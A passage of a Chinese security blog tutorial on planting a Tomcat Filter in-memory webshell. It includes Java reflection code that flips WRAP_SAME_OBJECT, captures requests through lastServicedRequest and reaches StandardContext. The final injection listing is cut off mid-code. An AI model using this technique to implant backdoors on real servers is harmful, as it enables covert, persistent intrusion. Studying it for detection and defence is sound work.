<h4 id="FilterChain创建"><a href="#FilterChain创建" class="headerlink" title="FilterChain创建"></a>FilterChain创建</h4><p>FilterChain创建由StandardWrapperValve创建<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724004559.png" alt="image.png"></p>
<p>跟进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724005632.png" alt="image.png"></p>
<p>可以看见首先是<code>context.findFilterMaps()</code>找到context中已经存在的<code>FilterMaps</code>, 再遍历<code>FilterMaps</code>, 由<code>FilterMap</code>在已存在的filterConfigs中找到具体的<code>filterConfig</code></p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010043.png" alt="image.png"></p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010115.png" alt="image.png"></p>
<p>由于Filter是&#x3D;&#x3D;动态创建&#x3D;&#x3D;的, 要打入内存马的话, 理论上反射修改这两个map就可以了</p>
<p>对于FilterMap, StandardContext提供了两个方法来直接添加</p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010715.png" alt="image.png"><br>看上层接口注释, 其中<code>addFilterMapBefore</code>可以将FilterMap放在第一位<br>需要注意的是, 这两个方法都要经过<code>validateFilterMap</code>的验证, 主要是验证是否存在对应的<code>FilterDef</code>, 所以还要反射修改对应的<code>filterDefs</code></p>
<h4 id="内存马构造"><a href="#内存马构造" class="headerlink" title="内存马构造"></a>内存马构造</h4><h5 id="获取-StandardContext对象"><a href="#获取-StandardContext对象" class="headerlink" title="获取 StandardContext对象"></a>获取 <code>StandardContext</code>对象</h5><p>想要修改&#x3D;&#x3D;<code>StandardContext</code>&#x3D;&#x3D;中的&#x3D;&#x3D;<code>FilterMap</code>, <code>FilterDefs</code>, <code>FilterConfigs</code>&#x3D;&#x3D;, 就必须先拿到当前的<code>StandardContext</code>, 假如有这样一个反序列化入口, 我们想拿到<code>StandardContext</code>, 大部分文章都是从request入手<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215414.png" alt="image.png"></p>
<p>request对象上层接口可以获取当前session<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215733.png" alt="image.png"><br>而session的上层接口定义了它可以获取ServletContext<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215837.png" alt="image.png"></p>
<p>当然这只是一层接口, 实际上拿到的类有没有实现这几个接口, 返回的对象具体是什么类型, 还得去调试看看</p>
<p>可以看见<br>我们真正拿到的类是一个<code>RequestFacade</code> 这是[[Facade模式]]运用, </p>
<p>其目的是屏蔽tomcat核心接口(例如直接动态得插入filter等), 只暴露允许用户操作的接口</p>
<p>直接转到类中<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725231413.png" alt="image.png"></p>
<p><code>RequestFacade</code>是<code>HttpServletRequest</code>的实现类, <code>HttpServletRequest</code>是<code>ServletRequest</code>的实现类<br><code>RequestFacade</code>实现了<code>getServletContext()</code>方法, 返回了一个<code>ServletContext</code>,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725231800.png" alt="image.png"><br>具体返回的是什么类, 也得调试看一下<br>写个demo看一下,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233413.png" alt="image.png"></p>
<p>拿到的其实是<code>org.apache.catalina.core.ApplicationContextFacade</code>, 依旧是[[Facade模式]]的Facade<br>找到这个类, 看一下结构有一个<code>ApplicationContext</code>类型的属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233112.png" alt="image.png"><br>再深入<code>ApplicationContext</code>里存着<code>StandardContext</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233152.png" alt="image.png"></p>
<p>梳理一下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726004757.png" alt="image.png"></p>
<p>这样确实能拿到StandardContext, 但是实际打内存马的时候是类加载, 从哪去找这个RequestFacade对象?</p>
<h6 id="通过lastServicedRequest"><a href="#通过lastServicedRequest" class="headerlink" title="通过lastServicedRequest"></a>通过<code>lastServicedRequest</code></h6><blockquote>
<p>为了<strong>在 filter&#x2F;servlet 执行期间，允许某些外部工具（如 JMX 或调试器）访问当前请求对象</strong>。Tomcat 把 <code>lastServicedRequest</code>&#x2F;<code>Response</code> 放在 <code>ApplicationFilterChain</code> 类中<br>    —来自ai解释</p>
</blockquote>
<p>当<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为true时, 这里是会放进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726010004.png" alt="image.png"><br>这是两个静态属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726010252.png" alt="image.png"><br>也就是说可以直接访问到, 因此直接反射修改即可, 但是需要注意的是, 修改<code>WRAP_SAME_OBJECT</code>为true后, 下一次请求才会把request和respone保存进去, 所以想打进去内存马就得发两次请求,<br>第一次请求&#x3D;&#x3D;设置<code>WRAP_SAME_OBJECT</code>为true并为<code>lastServicedRequest</code> <code>lastServicedResponse</code>这两个静态变量赋值&#x3D;&#x3D;,<br>第二次请求&#x3D;&#x3D;触发<code>lastServicedRequest.set(request);</code>并拿到request&#x3D;&#x3D;</p>
<p>并且如果<code>WRAP_SAME_OBJECT</code>为true一直为true的话,  <code>lastServicedRequest</code>是会被置空的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729163709.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">              </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">              </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">              </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二次请求后顺利拿到<code>RequestFacade</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729171612.png" alt="image.png"></p>
<p>进一步拿到StandardContext</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729173924.png" alt="image.png"><br>可以看见这里获取的就是我们的StandardContext</p>
<h6 id="通过Thread"><a href="#通过Thread" class="headerlink" title="通过Thread"></a>通过Thread</h6><p>pass</p>
<p>接下来就是去修改 <code>FilterDef</code>, <code>FilterConfigs</code>, <code>FilterMaps</code><br>这块主要还是靠自己边看边这几个类的结构边写代码, 我的代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> 